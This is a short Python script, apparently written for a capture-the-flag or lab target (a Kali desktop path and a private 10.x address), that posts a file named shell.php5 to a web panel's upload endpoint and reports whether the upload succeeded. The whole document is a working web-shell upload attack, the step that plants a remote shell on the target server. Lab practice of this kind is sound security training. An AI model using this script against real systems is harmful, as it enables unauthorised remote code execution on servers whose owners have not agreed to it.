import requests
dfile = open("/home/kali/Desktop/shell.php5", "rb")
url = "http://10.10.163.223/panel/"
test_res = requests.post(url, dfile)
if test_res.ok:
    print(" File uploaded successfully ! ")
    print(test_res.text)
else:
    print(" Please Upload again ! ")